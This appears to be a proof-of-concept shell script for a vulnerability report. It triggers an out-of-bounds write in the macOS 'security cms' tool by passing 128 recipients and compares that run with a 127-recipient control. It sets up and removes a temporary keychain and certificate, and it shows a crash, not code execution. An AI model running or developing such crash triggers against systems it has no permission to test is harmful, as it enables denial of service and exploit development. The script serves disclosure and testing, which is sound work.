#!/bin/bash
set -euo pipefail

# PoC: macOS /usr/bin/security cms recipient-array out-of-bounds write
#
# Demonstrates:
#   - 127-recipient control case
#   - 128-recipient vulnerable boundary with -v placed after -r
#
# Previously reproduced on:
#   macOS 26.6.2 (Build 25G83)
#   /usr/bin/security: Security-61901.160.44

TMPDIR_POC="$(mktemp -d "${TMPDIR:-/tmp}/security-cms-poc.XXXXXX")"
KEYCHAIN="$TMPDIR_POC/cms-test.keychain-db"
PASS="testpass"
EMAIL="test@example.com"
INPUT="$TMPDIR_POC/msg.txt"

echo "=== System identity ==="
sw_vers
echo
strings /usr/bin/security | grep 'PROGRAM:security' || true
shasum -a 256 /usr/bin/security
echo

# Save the existing user keychain search list so it can be restored.
ORIGINAL_KEYCHAINS="$(security list-keychains -d user | tr -d '"' || true)"

cleanup() {
    if [ -n "${ORIGINAL_KEYCHAINS:-}" ]; then
        # Restore the original keychain search list.
        # shellcheck disable=SC2086
        security list-keychains -d user -s $ORIGINAL_KEYCHAINS >/dev/null 2>&1 || true
    fi

    security delete-keychain "$KEYCHAIN" >/dev/null 2>&1 || true
    rm -rf "$TMPDIR_POC"
}
trap cleanup EXIT

echo "[+] Creating temporary keychain"
security create-keychain -p "$PASS" "$KEYCHAIN"
security unlock-keychain -p "$PASS" "$KEYCHAIN"
security list-keychains -d user -s "$KEYCHAIN"

echo "[+] Creating temporary S/MIME recipient certificate"
openssl req -x509 -newkey rsa:2048 \
    -keyout "$TMPDIR_POC/key.pem" \
    -out "$TMPDIR_POC/cert.pem" \
    -days 1 \
    -nodes \
    -subj "/CN=CMS Test/emailAddress=$EMAIL" \
    >/dev/null 2>&1

security add-certificates -k "$KEYCHAIN" "$TMPDIR_POC/cert.pem"
security find-certificate -a -e "$EMAIL" "$KEYCHAIN" >/dev/null

printf 'hello\n' > "$INPUT"

run_case() {
    local N="$1"
    local RECIPIENTS
    local OUT
    local ERR
    local STATUS

    RECIPIENTS="$(python3 -c "print(','.join(['$EMAIL']*$N))")"
    OUT="$TMPDIR_POC/out-${N}.cms"
    ERR="$TMPDIR_POC/err-${N}.txt"

    echo
    echo "=== Testing $N recipients (-v after -r) ==="

    # Disable exit-on-error only around the process under test so a crash
    # does not terminate the PoC before its exit status can be recorded.
    set +e
    /usr/bin/security cms \
        -E \
        -k "$KEYCHAIN" \
        -r "$RECIPIENTS" \
        -v \
        -i "$INPUT" \
        -o "$OUT" \
        > /dev/null 2>"$ERR"
    STATUS=$?
    set -e

    echo "exit=$STATUS"

    if [ -f "$OUT" ]; then
        echo "output_bytes=$(wc -c < "$OUT" | tr -d ' ')"
    else
        echo "output_bytes=0"
    fi

    if [ -s "$ERR" ]; then
        echo "--- stderr ---"
        sed -n '1,20p' "$ERR"
        echo "--------------"
    fi
}

# Safe boundary control.
run_case 127

# Vulnerable boundary. On the tested affected build this reproducibly
# terminates with SIGSEGV (shell exit status 139).
run_case 128

echo
echo "=== Expected result on affected build ==="
echo "127 recipients: exit 0"
echo "128 recipients: Segmentation fault: 11 / exit 139"
